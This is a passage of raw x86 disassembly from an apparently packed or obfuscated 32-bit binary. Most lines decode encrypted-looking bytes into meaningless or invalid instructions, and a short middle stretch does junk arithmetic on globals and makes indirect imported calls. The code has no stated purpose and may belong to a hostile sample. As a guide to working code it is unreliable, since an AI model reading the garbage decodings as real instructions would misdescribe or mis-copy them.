  40419d:	or     BYTE PTR [edi+0x13],bh
  4041a0:	mov    cl,0x50
  4041a2:	or     bh,BYTE PTR [ecx+0x49c7e2af]
  4041a8:	(bad)  
  4041ab:	(bad)  
  4041ad:	out    dx,eax
  4041ae:	pop    ecx
  4041af:	aad    0xc7
  4041b1:	loope  0x4041e1
  4041b3:	div    bl
  4041b5:	and    DWORD PTR [ebp+0x4],ebp
  4041b8:	lods   al,BYTE PTR ds:[esi]
  4041b9:	cmc    
  4041ba:	data16 jecxz 0x404203
  4041bd:	or     DWORD PTR [esi],esp
  4041bf:	lods   eax,DWORD PTR ds:[esi]
  4041c0:	and    edi,ebp
  4041c2:	dec    esp
  4041c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041c4:	pop    ds
  4041c5:	lock pop ss
  4041c7:	xchg   edi,eax
  4041c8:	nop
  4041c9:	mov    bh,0x92
  4041cb:	clc    
  4041cc:	sbb    ebx,eax
  4041ce:	je     0x4041d1
  4041d0:	outs   dx,BYTE PTR ds:[esi]
  4041d1:	mov    edi,0x809d0e21
  4041d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041d7:	out    dx,eax
  4041d8:	out    0x44,eax
  4041da:	adc    dh,BYTE PTR [esi+0x15d0e7e4]
  4041e0:	repnz jecxz 0x4041cb
  4041e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041e4:	xchg   DWORD PTR [ebp-0x37],ecx
  4041e7:	(bad)  
  4041e9:	adc    al,0x31
  4041eb:	clc    
  4041ec:	or     ebx,DWORD PTR [edi+0x1e]
  4041ef:	add    DWORD PTR [edx],eax
  4041f1:	inc    esi
  4041f2:	inc    ecx
  4041f3:	leave  
  4041f4:	push   esi
  4041f5:	xchg   edi,eax
  4041f6:	aaa    
  4041f7:	mov    eax,0x137275e3
  4041fc:	sub    ebp,edx
  4041fe:	cdq    
  4041ff:	inc    edi
  404200:	mov    es,WORD PTR [eax-0x3a1c666a]
  404206:	lea    eax,[ebx+0x21]
  404209:	dec    edi
  40420a:	out    0x22,eax
  40420c:	repnz addr16 pop ss
  40420f:	ins    DWORD PTR es:[edi],dx
  404210:	(bad)  
  404211:	sbb    eax,0xbcc97d97
  404216:	cmp    BYTE PTR [ebx+edi*4],0x9f
  40421a:	xchg   edx,eax
  40421b:	sar    BYTE PTR [ecx+edi*8],1
  40421e:	xlat   BYTE PTR ds:[ebx]
  40421f:	(bad)  
  404220:	jnp    0x404286
  404222:	ins    BYTE PTR es:[edi],dx
  404223:	les    ecx,FWORD PTR [ebx-0x45]
  404226:	pusha  
  404227:	jne    0x40427a
  404229:	add    esi,DWORD PTR [ebx-0x16f7d26d]
  40422f:	shl    DWORD PTR [edx-0x39],0x1b
  404233:	nop
  404234:	aad    0x2
  404236:	and    al,0xe1
  404238:	and    BYTE PTR [ebp+0x30],cl
  40423b:	ins    BYTE PTR es:[edi],dx
  40423c:	inc    ecx
  40423d:	push   0x48145c00
  404242:	lods   al,BYTE PTR ds:[esi]
  404243:	push   es
  404244:	out    0xbe,eax
  404246:	call   FWORD PTR [edx]
  404248:	(bad)  
  404249:	jmp    0x4042b1
  40424b:	add    BYTE PTR [esi],dl
  40424d:	jbe    0x40420c
  40424f:	shr    DWORD PTR [esi-0x15ee611a],0xea
  404256:	and    DWORD PTR [ebx+0x7f],ebp
  404259:	(bad)  
  40425a:	push   0x6ea9bf6c
  40425f:	repz neg DWORD PTR [esi+0x709289f3]
  404266:	scas   al,BYTE PTR es:[edi]
  404267:	xor    BYTE PTR [esi],bh
  404269:	jl     0x404242
  40426b:	cmp    eax,0xc1923d43
  404270:	adc    al,0x13
  404272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404273:	iret   
  404274:	int    0xa2
  404276:	jbe    0x404228
  404278:	fdivr  DWORD PTR [eax-0x44]
  40427b:	xor    al,0xbc
  40427d:	push   es
  40427e:	xchg   edi,eax
  40427f:	cs pop ecx
  404281:	pusha  
  404282:	sbb    eax,0x1d048b58
  404287:	stos   BYTE PTR es:[edi],al
  404288:	icebp  
  404289:	or     BYTE PTR [ecx+ebp*4+0x101547b7],ah
  404290:	mov    ds:0x756801c1,al
  404295:	test   al,0x9f
  404297:	inc    ecx
  404298:	inc    esp
  404299:	jmp    0x40422b
  40429b:	and    ecx,DWORD PTR [edx+eiz*4-0x1d]
  40429f:	dec    ecx
  4042a0:	push   cs
  4042a1:	mov    ebp,0x13f3a6b8
  4042a6:	dec    edx
  4042a7:	or     DWORD PTR [edi],eax
  4042a9:	lds    ebp,FWORD PTR [edi]
  4042ab:	add    DWORD PTR [esi-0x33],esp
  4042ae:	test   BYTE PTR [edx+0x53],dh
  4042b1:	sub    ah,cl
  4042b3:	test   al,0xb1
  4042b5:	gs xor eax,0xe3322739
  4042bb:	pop    edx
  4042bc:	or     al,0x80
  4042be:	retf   0x34a0
  4042c1:	mov    gs,WORD PTR ds:0xf96f02a5
  4042c7:	ss push 0xd71457d5
  4042cd:	inc    eax
  4042ce:	bound  esi,QWORD PTR [ebp+eiz*1-0x34aa800]
  4042d5:	sub    dh,BYTE PTR [ebp+0x4c]
  4042d8:	dec    eax
  4042d9:	mov    ebx,0xe10f6f21
  4042de:	and    BYTE PTR [ebx+0x65893440],ch
  4042e4:	and    ah,BYTE PTR [ebp+0x4f]
  4042e7:	in     eax,dx
  4042e8:	jg     0x404361
  4042ea:	repz add dh,BYTE PTR [eax-0x43582d75]
  4042f1:	sahf   
  4042f2:	push   ecx
  4042f3:	in     eax,dx
  4042f4:	leave  
  4042f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042f6:	jno    0x40434d
  4042f8:	maskmovq mm4,(bad)
  4042f9:	mul    DWORD PTR [ebx+0x6d]
  4042fc:	or     ch,BYTE PTR [edi-0x7d9b9b26]
  404302:	mov    bh,0xbf
  404304:	jg     0x404290
  404306:	cdq    
  404307:	mov    DWORD PTR [ebp+0xb],0x25425397
  40430e:	loopne 0x4042ac
  404310:	or     ah,BYTE PTR [ebp+0x2facc83a]
  404316:	dec    ebp
  404317:	inc    ecx
  404318:	jmp    0xff394aac
  40431d:	call   0x970e:0x6f081f9c
  404324:	repz jbe 0x404334
  404327:	jae    0x4042e2
  404329:	cs fs xchg esp,eax
  40432c:	jle    0x4042b2
  40432e:	imul   ecx,ecx,0x6f
  404331:	adc    esi,DWORD PTR [edx-0x4c1d532b]
  404337:	jne    0x404372
  404339:	pop    esp
  40433a:	xor    eax,0xaccd226e
  40433f:	push   0x75
  404341:	mov    ch,0xed
  404343:	cmp    al,0xb1
  404345:	add    eax,0xc7ec4d8b
  40434a:	add    eax,0x42299a
  40434f:	jb     0x4043b7
  404351:	add    BYTE PTR [eax],al
  404353:	cmp    eax,DWORD PTR [ecx]
  404355:	mov    DWORD PTR ds:0x42289a,0xce0
  40435f:	jne    0x4044cf
  404365:	or     eax,DWORD PTR ds:0x422922
  40436b:	mov    eax,DWORD PTR [ebp-0xc]
  40436e:	cmp    DWORD PTR ds:0x4229ce,0x0
  404375:	mov    ecx,DWORD PTR ds:0x4229b2
  40437b:	not    ecx
  40437d:	jmp    0x4043e2
  404382:	mov    DWORD PTR ds:0x4228ce,0x6b59
  40438c:	mov    DWORD PTR ds:0x4228a6,edi
  404392:	jb     0x4043a7
  404398:	push   0x82d3
  40439d:	call   DWORD PTR ds:0x42a010
  4043a3:	xor    ecx,ecx
  4043a5:	adc    edx,ecx
  4043a7:	or     DWORD PTR ds:0x422992,0x7718
  4043b1:	mov    ecx,DWORD PTR ds:0x422a76
  4043b7:	mov    edx,DWORD PTR ds:0x422ade
  4043bd:	sub    ecx,edx
  4043bf:	xor    ecx,DWORD PTR [ecx+edx*1]
  4043c2:	mov    ecx,DWORD PTR ds:0x4229fe
  4043c8:	xor    edx,edx
  4043ca:	or     edx,DWORD PTR ds:0x422ace
  4043d0:	sub    edx,ecx
  4043d2:	sub    ecx,DWORD PTR [ecx+edx*1]
  4043d5:	movzx  edx,BYTE PTR ds:0x42292e
  4043dc:	add    DWORD PTR ds:0x4229a2,edx
  4043e2:	mov    ecx,DWORD PTR [ebp+0x20]
  4043e5:	movzx  edx,WORD PTR ds:0x4229ba
  4043ec:	or     edx,DWORD PTR ds:0x4229b2
  4043f2:	mov    DWORD PTR ds:0x4229ba,edx
  4043f8:	xor    DWORD PTR [eax],ecx
  4043fa:	mov    eax,DWORD PTR [ebp-0xc]
  4043fd:	mov    ecx,DWORD PTR [ebp+0x18]
  404400:	adc    DWORD PTR ds:0x422992,0x4b0d
  40440a:	mov    edx,DWORD PTR [ebp+0x1c]
  40440d:	shrd   ecx,edx,0x2
  404411:	and    DWORD PTR ds:0x4229ba,0x18b0
  40441b:	mov    DWORD PTR [ebp-0x14],ecx
  40441e:	add    ecx,0x56bc
  404424:	mov    ecx,DWORD PTR [ebp+0x18]
  404427:	xor    DWORD PTR [ebp-0x14],edi
  40442a:	sbb    DWORD PTR ds:0x42291e,0x4252
  404434:	shr    edx,0x2
  404437:	mov    edx,DWORD PTR [ebp+0x1c]
  40443a:	add    DWORD PTR ds:0x4228ce,0x42299e
  404444:	xor    edx,edx
  404446:	and    DWORD PTR ds:0x4228d6,0x4228ea
  404450:	or     edx,DWORD PTR [ebp-0x14]
  404453:	add    DWORD PTR ds:0x42289e,0x4229a2
  40445d:	shl    ecx,0x1e
  404460:	cmp    DWORD PTR ds:0x42294e,0x0
  404467:	mov    ecx,0x1e7
  40446c:	mov    DWORD PTR ds:0x4228ba,0x3be7
  404476:	mov    DWORD PTR ds:0x4229a2,edx
  40447c:	mov    ecx,0x41a9
  404481:	jmp    0x4044cd
  404486:	mov    DWORD PTR ds:0x42297a,0x6783
  404490:	mov    DWORD PTR ds:0x4228ee,0x5319
  40449a:	jl     0x4044b5
  4044a0:	push   DWORD PTR [ebp-0x18]
  4044a3:	call   DWORD PTR ds:0x42a014
  4044a9:	or     ecx,DWORD PTR ds:0x42290e
  4044af:	xor    DWORD PTR ds:0x4228d6,ebx
  4044b5:	xor    DWORD PTR ds:0x4229b2,0x1ac5
  4044bf:	inc    DWORD PTR ds:0x422956
  4044c5:	add    ecx,0x7d03
  4044cb:	not    ecx
  4044cd:	sub    DWORD PTR [eax],edx
  4044cf:	mov    eax,ds:0x4220e0
  4044d4:	mov    ecx,DWORD PTR [ebp-0xc]
  4044d7:	sbb    edx,DWORD PTR ds:0x4228c2
  4044dd:	mov    eax,DWORD PTR [eax]
  4044df:	add    eax,DWORD PTR [ecx]
  4044e1:	mov    edx,DWORD PTR ds:0x42297e
  4044e7:	and    edx,DWORD PTR ds:0x42288e
  4044ed:	mov    DWORD PTR ds:0x42297e,edx
  4044f3:	mov    DWORD PTR [ebp-0x14],eax
  4044f6:	mov    ecx,DWORD PTR [ebx]
  4044f8:	or     DWORD PTR ds:0x422922,edx
  4044fe:	mov    eax,DWORD PTR [ebx+0x4]
  404501:	xor    DWORD PTR ds:0x42299e,ebx
  404507:	jmp    0x404a91
  40450c:	xlat   BYTE PTR ds:[ebx]
  40450d:	mov    edi,0x38f472f4
  404512:	push   eax
  404513:	xor    dl,BYTE PTR [eax+0x1a68228e]
  404519:	mov    dl,0xb2
  40451b:	jb     0x4044a4
  40451d:	rcl    DWORD PTR [esi],0x16
  404520:	cmp    eax,0x23161604
  404525:	lds    ebx,FWORD PTR [edi-0x24]
  404528:	jo     0x404577
  40452a:	xor    dl,BYTE PTR [ebx]
  40452c:	xchg   edi,eax
  40452d:	xor    DWORD PTR [ebp-0x15],0xad2c2a0c
  404534:	and    dl,bh
  404536:	dec    ebp
  404537:	mov    esp,0x3fe873e2
  40453c:	adc    al,0x54
  40453e:	aaa    
  40453f:	inc    eax
  404540:	xchg   esi,eax
  404541:	pop    ss
  404542:	cmp    eax,0x3c87fc3b
  404547:	xchg   edx,eax
  404548:	xor    BYTE PTR [ebx-0x69],dh
  40454b:	aas    
  40454c:	pop    ebp
  40454d:	pop    esi
  40454e:	enter  0xb26d,0xb4
  404552:	jge    0x4045c1
  404554:	xchg   ecx,eax
  404555:	or     dh,ah
  404557:	sti    
  404558:	jnp    0x404536
  40455a:	shl    bh,0x7f
  40455d:	mov    esp,0xee4d90d8
  404562:	aam    0xac
  404564:	(bad)  
  404565:	fwait
  404566:	rol    DWORD PTR [ebp-0x1a306b3a],0x9b
  40456d:	push   0xffffffbf
  40456f:	xchg   esp,eax
  404570:	dec    eax
  404571:	pop    ebx
  404572:	ror    dh,1
  404574:	pop    edi
  404575:	push   es
  404576:	mov    dh,0x89
  404578:	pop    edi
  404579:	add    ah,dl
  40457b:	out    0x40,al
  40457d:	lea    edx,[edx-0x31]
  404580:	inc    ebp
  404581:	dec    esp
  404582:	add    esp,DWORD PTR [edx+0x2a]
  404585:	mov    cl,0x64
  404587:	cmp    al,0xfa
  404589:	ins    BYTE PTR es:[edi],dx
  40458a:	ficomp DWORD PTR [ebx]
  40458c:	adc    BYTE PTR [eax-0x65d8294f],ah
  404592:	mov    dh,0xeb
  404594:	aad    0x50
  404596:	and    ecx,DWORD PTR [eax-0x794dc62b]
  40459c:	es fstp st(3)
  40459f:	pop    ebx
  4045a0:	mov    BYTE PTR [ebp-0x2b],ch
  4045a3:	xchg   esp,eax
  4045a4:	mov    WORD PTR [edx+0x1b896f25],ds
  4045aa:	fnsave [eax-0x57]
  4045ad:	jge    0x404625
  4045af:	xor    eax,0xb7379079
  4045b4:	inc    ecx
  4045b5:	adc    BYTE PTR [edx+0x2ef64884],0x58
  4045bc:	arpl   WORD PTR [ebp+ecx*4+0x42],di
  4045c0:	arpl   WORD PTR [ecx],di
  4045c2:	cmc    
  4045c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045c4:	inc    edx
  4045c5:	sti    
  4045c6:	or     al,0xbd
  4045c8:	jmp    DWORD PTR [eax]
  4045ca:	mov    ah,0xb1
  4045cc:	jl     0x40460a
  4045ce:	test   eax,0x66cde5b5
  4045d3:	inc    eax
  4045d4:	aad    0x38
  4045d6:	pop    esi
  4045d7:	repnz mov esp,0xfd0c6e8d
  4045dd:	sub    esp,DWORD PTR [ebx]
  4045df:	and    ebp,DWORD PTR [ebx-0x36323a5e]
  4045e5:	xor    cl,BYTE PTR [ecx-0x74]
  4045e8:	pop    eax
  4045e9:	mov    BYTE PTR [eax+0x7785d0c2],bh
  4045ef:	mov    edx,0xfd14f8c
  4045f4:	sbb    eax,0xb5b47d11
  4045f9:	repnz pop ebx
  4045fb:	cmp    cl,BYTE PTR [edi]
  4045fd:	mov    bh,BYTE PTR [ebx]
  4045ff:	jbe    0x40461d
  404601:	(bad)  
  404602:	mov    ebp,0xec669427
  404607:	mov    al,0x1a
  404609:	pusha  
  40460a:	inc    eax
  40460b:	ins    DWORD PTR es:[edi],dx
  40460c:	fstp   st(5)
  40460e:	imul   eax,DWORD PTR [ecx+0x31769616],0x2a
  404615:	cld    
  404616:	push   0x8d401c71
  40461b:	adc    ch,BYTE PTR [ecx-0x7c76c49d]
  404621:	clc    
  404622:	add    DWORD PTR [edi+ebp*4],esi
  404625:	dec    edi
  404626:	mov    bh,0xf5
  404628:	dec    esp
  404629:	sub    al,0xbd
  40462b:	cmp    al,0xed
  40462d:	std    
  40462e:	jp     0x4045c6
  404630:	hlt    
  404631:	jne    0x40460b
  404633:	(bad)  
  404634:	rcl    esp,1
  404636:	outs   dx,BYTE PTR ds:[esi]
  404637:	outs   dx,BYTE PTR ds:[esi]
  404638:	call   0x449b:0xa52766ee
  40463f:	mov    edx,0xeeaee06a
  404644:	pushf  
  404645:	mov    eax,ds:0x9872156
  40464a:	call   FWORD PTR [edx]
  40464c:	in     al,0xe6
  40464e:	pop    es
  40464f:	call   0x6514dcdb
  404654:	mov    eax,ds:0x772abf49
  404659:	pop    edi
  40465a:	repnz adc ebx,DWORD PTR [ebx+0x6d412f9a]
  404661:	enter  0xb237,0x5
  404665:	sbb    BYTE PTR [ebp-0x4d],cl
  404668:	xor    DWORD PTR ds:0x5c52ba4f,0xffffffae
  40466f:	rcl    ch,0xae
  404672:	ror    BYTE PTR [eax-0x35148f4c],cl
  404678:	xchg   esi,eax
  404679:	inc    eax
  40467a:	push   ebx
  40467b:	ins    BYTE PTR es:[edi],dx
  40467c:	pushf  
  40467d:	cmp    DWORD PTR [esi],esi
  40467f:	and    bl,BYTE PTR [ecx*8-0x2712d825]
  404686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404687:	ds pop ecx
  404689:	xchg   ebx,eax
  40468a:	cwde   
  40468b:	push   ebp
  40468c:	sbb    dh,BYTE PTR [eax+0x1f2b3289]
  404692:	xchg   esi,eax
  404693:	jns    0x40470a
  404695:	adc    BYTE PTR [esi],ah
  404697:	imul   eax,DWORD PTR [esi+0x76a82a49],0x5748204a
  4046a1:	mov    al,ds:0xd90ff73
  4046a6:	sub    ebx,DWORD PTR [ebp-0x59a4d3da]
  4046ac:	ret    0x3cc1
  4046af:	mov    eax,0x7b85dbf5
  4046b4:	cmp    ah,BYTE PTR [ebp-0x70]
  4046b7:	xchg   ebp,eax
  4046b8:	loope  0x404681
  4046ba:	mov    bl,0x64
  4046bc:	xchg   ecx,eax
  4046bd:	mov    esi,0x4af9819b
  4046c2:	call   0x423410a8
  4046c7:	stos   BYTE PTR es:[edi],al
  4046c8:	mov    ah,0x84
  4046ca:	fcomp  DWORD PTR [esp+edx*1-0x275d3c83]
  4046d1:	sbb    cl,BYTE PTR [esi+eax*4+0x2d0c9f40]
  4046d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046d9:	mov    bh,0xb2
  4046db:	dec    edx
  4046dc:	icebp  
  4046dd:	push   cs
  4046de:	fdiv   st,st(5)
  4046e0:	dec    edx
  4046e1:	out    dx,al
  4046e2:	or     eax,0xe7bfb419
  4046e7:	loope  0x4046a8
  4046e9:	jp     0x40473f
  4046eb:	cmp    DWORD PTR [ebx],esp
  4046ed:	jecxz  0x404679
  4046ef:	es mov edx,0x7a5528fe
  4046f5:	fs adc bl,cl
  4046f8:	jmp    0x404741
  4046fa:	mov    WORD PTR [edx+eiz*8],ss
  4046fd:	adc    al,0xac
  4046ff:	push   ebp
  404700:	dec    eax
  404701:	sub    edx,0x210d46d0
  404707:	sub    dh,ch
  404709:	cmp    ecx,ebp
  40470b:	mov    ch,0xf0
  40470d:	sub    eax,0xf00cacb4
  404712:	mov    gs,WORD PTR ds:0xc6f51e70
  404718:	mov    ebp,0xf22d8dcd
  40471d:	ins    BYTE PTR es:[edi],dx
  40471e:	in     al,dx
  40471f:	jmp    0x94e8c635
  404724:	xor    esp,DWORD PTR [eax+0x3c]
  404727:	inc    ecx
  404728:	sahf   
  404729:	aaa    
  40472a:	pop    ds
  40472b:	cs (bad) 
  40472e:	addr16 loop 0x4046d4
  404731:	lahf   
  404732:	cld    
  404733:	mov    eax,DWORD PTR [edx+0x3068a992]
  404739:	repnz and BYTE PTR [ecx+0x8],al
  40473d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40473e:	js     0x4047b1
  404740:	loop   0x4046fc
  404742:	xor    esi,eax
  404744:	inc    eax
  404745:	es mov ah,0xeb
  404748:	test   eax,0xccf53513
  40474d:	dec    eax
  40474e:	mov    WORD PTR [eax+0x3d27481c],es
  404754:	and    al,0x2a
  404756:	sub    BYTE PTR gs:[ebp-0x16],cl
  40475a:	adc    esi,DWORD PTR [esi+eiz*2-0x3d8e819f]
  404761:	popa   
  404762:	rcl    BYTE PTR ds:0x413c13cd,1
  404768:	ss push ecx
  40476a:	jbe    0x404710
  40476c:	sbb    al,0xae
  40476e:	cdq    
  40476f:	push   es
  404770:	xor    al,0x47
  404772:	mov    dl,0x25
  404774:	fmul   st(7),st
  404776:	jecxz  0x4046ff
  404778:	clc    
  404779:	jne    0x4047f8
  40477b:	mov    esi,0x5a9a290b
  404780:	mov    cl,0xfb
  404782:	mov    ds:0xd7d97bb,al
  404787:	int3   
  404788:	push   ecx
  40478a:	add    DWORD PTR [eax-0x5e0b7efa],esi
  404790:	lahf   
  404791:	xchg   esp,eax
  404792:	(bad)  
  404793:	push   eax
  404794:	cmp    eax,0x6cd22c6a
  404799:	xchg   esi,eax
  40479a:	cdq    
  40479b:	popf   
  40479c:	sbb    ebx,eax
  40479e:	ins    DWORD PTR es:[edi],dx
  40479f:	pop    ebx
  4047a0:	mov    bl,0x4f
  4047a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047a3:	push   esi
  4047a4:	jb     0x40476d
  4047a6:	jge    0x404821
  4047a8:	enter  0xab18,0xb
  4047ac:	aas    
  4047ad:	rcr    DWORD PTR [eax],1
  4047af:	lea    esi,[ebx]
  4047b1:	dec    ebx
  4047b2:	push   0x10
  4047b4:	jno    0x404755
  4047b6:	ret    
  4047b7:	sbb    DWORD PTR [eax-0x2c],ecx
  4047ba:	add    bh,dh
  4047bc:	clc    
  4047bd:	sub    bh,bl
  4047bf:	rcr    BYTE PTR [eax+edi*4+0x7a],0xae
  4047c4:	sub    eax,0x97052fe
  4047c9:	daa    
  4047ca:	nop
  4047cb:	dec    esp
  4047cc:	pop    ebx
  4047cd:	aas    
  4047ce:	js     0x4047d9
  4047d0:	cmp    DWORD PTR [esi+0x2e],0x8259d15a
  4047d7:	lea    edx,[edi]
  4047d9:	leave  
  4047da:	pop    ss
  4047db:	push   ds
  4047dc:	aas    
  4047dd:	add    al,0x9b
  4047df:	lds    eax,FWORD PTR [edi+0x10]
  4047e2:	xor    eax,0xd76bb6e5
  4047e7:	into   
  4047e8:	push   0x79
  4047ea:	daa    
  4047eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047ec:	xchg   ebp,eax
  4047ed:	shl    DWORD PTR [edx],1
  4047ef:	dec    ebx
  4047f0:	mov    ch,BYTE PTR [ecx+0x5b]
  4047f3:	jmp    0xa95cd215
  4047f8:	push   edi
  4047f9:	std    
  4047fa:	jp     0x4047b3
  4047fc:	aas    
  4047fd:	mov    dl,0xca
  4047ff:	sub    DWORD PTR [esi-0x5d],ebp
  404802:	fs mov ebx,0x129705d
  404808:	jns    0x4047f9
  40480a:	dec    esi
  40480b:	out    0x8d,eax
  40480d:	(bad)
  404810:	dec    esp
  404811:	call   0x1c00:0x90979297
  404818:	ror    DWORD PTR [ebx],cl
  40481a:	add    al,0xe5
  40481c:	push   ebp
  40481d:	mov    al,ds:0x446a1348
  404822:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404823:	cmc    
  404824:	bound  ebx,QWORD PTR [ebp-0x16fda7f6]
  40482a:	out    0x3c,al
  40482c:	call   0x1525:0x13aafa87
  404833:	push   esp
  404834:	mov    dh,0x54
  404836:	and    al,0xe2
  404838:	mov    esi,0x9bc2fdc3
  40483d:	enter  0x723b,0x31
  404841:	adc    DWORD PTR [edx],edi
  404843:	shl    DWORD PTR [ecx+esi*8-0x35518076],cl
  40484a:	outs   dx,DWORD PTR ds:[esi]
  40484b:	push   cs
  40484c:	retf   0x9dfd
  40484f:	je     0x4047ff
  404851:	div    BYTE PTR [ecx+0x65]
  404854:	and    al,0x77
  404856:	mov    ds:0x50459cde,al
  40485b:	dec    eax
  40485c:	and    edi,ebx
  40485e:	xchg   esi,eax
  40485f:	ins    BYTE PTR es:[edi],dx
  404860:	pop    esi
  404861:	pop    ss
  404862:	mov    ecx,0xef329ce4
  404867:	or     BYTE PTR ds:0x90c6562d,al
  40486d:	pop    es
  40486e:	loopne 0x40485e
  404870:	cli    
  404871:	mov    ebx,DWORD PTR [ebp-0x58]
  404874:	mov    eax,0x67aad80e
  404879:	xor    al,0xf2
  40487b:	lahf   
  40487c:	jg     0x404825
  40487e:	sbb    ah,BYTE PTR [edx+eax*8]
  404881:	jmp    0x404829
  404883:	push   edx
  404884:	fisubr WORD PTR [ecx+0x20e6f4f7]
  40488a:	out    0x62,eax
  40488c:	out    0x5b,al
  40488e:	sbb    dl,BYTE PTR [edx+0x4a]
  404891:	jle    0x404885
  404893:	inc    esp
  404894:	add    DWORD PTR [edi],esp
  404896:	mov    DWORD PTR [ebp+ebx*8+0x1b],edx
  40489a:	sbb    eax,DWORD PTR [ebp+edi*8+0x27]
  40489e:	sahf   
  40489f:	mov    ds,esi
  4048a1:	jmp    0x40489a
  4048a3:	pop    edi
  4048a4:	push   edi
  4048a5:	jo     0x40487b
  4048a7:	or     al,0x9
  4048a9:	push   eax
  4048aa:	jl     0x40486e
  4048ac:	and    DWORD PTR [eax],ebp
  4048ae:	imul   eax,DWORD PTR [esi-0x57],0x1eb26405
  4048b5:	fcmovu st,st(4)
  4048b7:	arpl   WORD PTR [ebx],bx
  4048b9:	cwde   
  4048ba:	push   cs
  4048bb:	inc    edx
  4048bc:	mov    bh,0x5d
  4048be:	mov    ah,0xca
  4048c0:	hlt    
  4048c1:	jecxz  0x404894
  4048c3:	stos   BYTE PTR es:[edi],al
  4048c4:	stos   BYTE PTR es:[edi],al
  4048c5:	div    DWORD PTR [edx]
  4048c7:	xchg   esp,eax
  4048c8:	(bad)  
  4048c9:	pop    ds
  4048ca:	jmp    FWORD PTR [eax-0x6d]
  4048cd:	aam    0x21
  4048cf:	push   esi
  4048d0:	daa    
  4048d1:	jns    0x4048bc
  4048d3:	xchg   ebp,eax
  4048d4:	jg     0x404896
  4048d6:	dec    ecx
  4048d7:	repnz and DWORD PTR [edx+0x5b],esp
  4048db:	mov    dl,0x38
  4048dd:	pop    ebp
  4048de:	outs   dx,BYTE PTR ds:[esi]
  4048df:	dec    esp
  4048e0:	jp     0x404898
  4048e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048e3:	mov    ah,0x98
  4048e5:	inc    ebp
  4048e6:	xchg   edx,eax
  4048e7:	mov    ebx,0x1cf02f8e
  4048ec:	adc    edi,DWORD PTR [edx-0x2c]
  4048ef:	push   ds
  4048f0:	gs cdq 
  4048f2:	xor    cl,0x9a
  4048f5:	jbe    0x404938
  4048f7:	adc    edx,DWORD PTR [edi]
  4048f9:	das    
  4048fa:	pushf  
  4048fb:	and    al,0x50
  4048fd:	stos   DWORD PTR es:[edi],eax
  4048fe:	stc    
  4048ff:	fisub  DWORD PTR ds:0xf06816e7
  404905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404906:	in     eax,dx
  404907:	dec    esi
  404908:	mov    dh,0xaf
  40490a:	dec    eax
  40490b:	add    eax,DWORD PTR [ebx-0x40]
  40490e:	leave  
  40490f:	mov    eax,0x124279dc
  404914:	inc    esp
  404915:	out    0x1,al
  404917:	(bad)  
  404918:	mov    WORD PTR ds:0x7efe15d6,cs
  40491e:	int3   
  40491f:	imul   ebp,DWORD PTR [edi+0x77],0xc8b1389
  404926:	es in  al,0x99
  404929:	xor    eax,0x794034aa
  40492e:	jl     0x404922
  404930:	or     bh,BYTE PTR [ebx+0x3248f638]
  404936:	cli    
  404937:	jo     0x4049a6
  404939:	ins    BYTE PTR es:[edi],dx
  40493a:	or     esp,DWORD PTR [esp+edx*8-0x77]
  40493e:	xor    al,0x65
  404940:	repnz and edi,ebx
  404943:	push   esp
  404944:	std    
  404945:	stc    
  404946:	das    
  404947:	mov    eax,0x5b04c7c1
  40494c:	add    al,0x5a
  40494e:	push   es
  40494f:	pop    ds
  404950:	repz inc esi
  404952:	fsub   QWORD PTR [ebx-0x46]
  404955:	xor    edi,DWORD PTR [di]
  404958:	(bad)  
  404959:	sar    BYTE PTR [edi],0xdc
  40495c:	aad    0xef
  40495e:	mov    ch,0x28
  404960:	push   esp
  404961:	mov    ds:0x2b6203c6,eax
  404966:	ss imul edi,edx,0x6029f097
  40496d:	cmp    edx,esi
  40496f:	pop    ebx
  404970:	mov    eax,ds:0x3a5955f3
  404975:	sti    
  404976:	or     BYTE PTR [esi-0x47041d12],ch
  40497c:	mov    esi,0x4bf6c70d
  404981:	dec    ebx
  404982:	aas    
  404983:	lods   eax,DWORD PTR ds:[esi]
  404984:	push   edx
  404985:	gs sbb esi,esp
  404988:	(bad)  
  404989:	ficom  WORD PTR [esi-0x20]
  40498c:	sub    eax,0x4a39393a
  404991:	sar    BYTE PTR [edi+0x41],1
  404994:	mov    eax,ds:0x425ac411
  404999:	sti    
  40499a:	aad    0xa3
  40499c:	inc    ebp
  40499d:	cmp    BYTE PTR [ebx],al
  40499f:	out    0xd6,eax
  4049a1:	and    eax,0xd039bb99
  4049a6:	adc    BYTE PTR [edi+0x46],bh
  4049a9:	mov    al,0xc0
  4049ab:	adc    BYTE PTR [esi-0x2f],dl
  4049ae:	pmuludq mm5,QWORD PTR [ecx-0x4baa90f9]
  4049b5:	mov    bh,0x5
  4049b7:	jmp    0x4049f0
  4049b9:	pop    eax
  4049ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049bb:	rcl    BYTE PTR ds:0x38f09745,0x2e
  4049c2:	mov    edx,0xabfeeed1
  4049c7:	push   ds
  4049c8:	jmp    0xe8ce:0x853a2090
  4049cf:	fld    st(1)
  4049d1:	inc    esp
  4049d2:	xchg   ebx,eax
  4049d3:	mov    ch,0x99
  4049d5:	imul   BYTE PTR [esi]
  4049d7:	add    esp,DWORD PTR [ebx+ebx*1]
  4049da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049db:	rcr    bh,1
  4049dd:	mov    bh,0x9b
  4049df:	push   edi
  4049e0:	imul   ebx,DWORD PTR [edi],0xe257ab43
  4049e6:	jl     0x404a22
  4049e8:	xchg   esi,eax
  4049e9:	imul   ebx,DWORD PTR [esi],0x1dbba498
  4049ef:	or     DWORD PTR ds:0x6f38fac1,esi
  4049f5:	and    BYTE PTR [esi+eax*1],0x76
  4049f9:	mov    ds,esi
  4049fb:	jns    0x40498c
